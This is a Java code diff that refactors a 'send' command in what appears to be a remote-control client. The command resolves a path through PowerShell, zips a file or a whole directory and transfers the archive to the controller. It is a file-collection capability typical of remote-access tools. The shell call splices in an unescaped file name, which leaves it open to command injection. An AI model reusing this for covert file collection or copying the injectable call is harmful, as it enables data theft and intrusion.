@@ -13,13 +13,11 @@ import control.Controller;
 
 public class SendCommand extends Command{
 	private String _fileName;
-	private String _path;
-	private String _zipPath;
-	private List<String> fileList;
+	private List<File> fileList;
 	
 	public SendCommand() {
 		super("send");
-		fileList = new ArrayList<String>();
+		fileList = new ArrayList<File>();
 	}
 
 	protected boolean parse(String command) {
@@ -41,60 +39,59 @@ public class SendCommand extends Command{
 	public void execute(Controller ctrl) throws IOException {
 		String path = ctrl.execute("Get-Item '" + _fileName + "' | Select-Object FullName | Format-List");
 		
-		_path = fetch(path);
-		_zipPath = _path + ".zip";
-		
-		send(compress(ctrl), ctrl);
+		File fileToCompress = new File(fetch(path));
+		if(fileToCompress.exists()) {
+			File fileCompressed = compress(fileToCompress, ctrl);
+			send(fileCompressed, ctrl);
+			fileCompressed.delete();
+		} else {
+			ctrl.sendMsg("The specified file/dir does not exists");
+		}
 	}
 
-	private String compress(Controller ctrl){
+	private File compress(File fileToCompress, Controller ctrl){
 		byte[] buffer = new byte[1024];
     	
 		try{
-			File fileToCompress = new File(_path);
-			if(fileToCompress.exists()) {
-				
-				FileOutputStream fos = new FileOutputStream(_zipPath);
-		    	ZipOutputStream zos = new ZipOutputStream(fos);
+			String path = fileToCompress.getAbsolutePath();
+			String zipPath = path + ".zip";
+			
+			FileOutputStream fos = new FileOutputStream(zipPath);
+		    ZipOutputStream zos = new ZipOutputStream(fos);
 		    	
-				if(fileToCompress.isFile()) {
-		    		ZipEntry ze= new ZipEntry(_fileName);
-		    		zos.putNextEntry(ze);
-		    		FileInputStream in = new FileInputStream(_path);
+			if(fileToCompress.isFile()) {
+		    	ZipEntry ze= new ZipEntry(_fileName);
+		    	zos.putNextEntry(ze);
+		    	FileInputStream in = new FileInputStream(path);
 		   	   
-		    		int len;
-		    		while ((len = in.read(buffer)) > 0) {
-		    			zos.write(buffer, 0, len);
-		    		}
+		    	int len;
+		    	while ((len = in.read(buffer)) > 0) {
+		    		zos.write(buffer, 0, len);
+		    	}
 	
-		    		in.close();
-				}
-				else {
-					generateFileList(fileToCompress);
-			    	
-			    	for(String file : this.fileList){
-			    		ZipEntry ze= new ZipEntry(file);
-			    		zos.putNextEntry(ze);
-			    		FileInputStream in = new FileInputStream(_path + File.separator + file);
-			    		
-			    		int len;
-			        	while ((len = in.read(buffer)) > 0) {
-			        		zos.write(buffer, 0, len);
-			        	}
-			        	in.close();
-			    	}
-				}
-				zos.closeEntry();
-		    	zos.close();
-		    	fos.close();
-		    	ctrl.sendMsg("Compressed " + fileToCompress.getName() + " into " + fileToCompress.getName() + ".zip");
-		    	
-		    	return _zipPath;
+		    	in.close();
 			}
 			else {
-				ctrl.sendMsg("The specified file/dir does not exists");
-				return null;
+				generateFileList(fileToCompress);
+			    	
+			   	for(File file : fileList){
+			   		ZipEntry ze= new ZipEntry(file.getName());
+			   		zos.putNextEntry(ze);
+			   		FileInputStream in = new FileInputStream(file.getAbsolutePath());
+			    		
+			   		int len;
+			       	while ((len = in.read(buffer)) > 0) {
+			       		zos.write(buffer, 0, len);
+			       	}
+			       	in.close();
+			   	}
 			}
+			zos.closeEntry();
+		    zos.close();
+		    fos.close();
+		    ctrl.sendMsg("File compressed");
+		    	
+		    return new File(zipPath);
 		}catch(Exception e) {
 	    	ctrl.sendMsg(e.getMessage());
 	    	return null;
@@ -104,10 +101,9 @@ public class SendCommand extends Command{
 	private void generateFileList(File node){
     	//add file only
 		if(node.isFile()){
-			fileList.add(node.getName());
+			fileList.add(node);
 		}
-			
-		if(node.isDirectory()){
+		else if(node.isDirectory()){
 			String[] subNote = node.list();
 			for(String filename : subNote){
 				generateFileList(new File(node, filename));
@@ -115,16 +111,11 @@ public class SendCommand extends Command{
 		}
     }
 	
-	//private String generateZipEntry(String file){
-    //	return file.substring(_path.length()+1, file.length());
-    //}
-	
-	private void send(String file, Controller ctrl){
+	private void send(File file, Controller ctrl){
 		if(file != null) {
 			try {
-				ctrl.sendMsg(_fileName + ".zip");
-				File fileToSend = new File(file);
-				ctrl.sendFile(fileToSend);
+				ctrl.sendMsg(file.getName());
+				ctrl.sendFile(file);
 			} catch (IOException e) {
 				ctrl.sendMsg(e.getMessage());
 			}
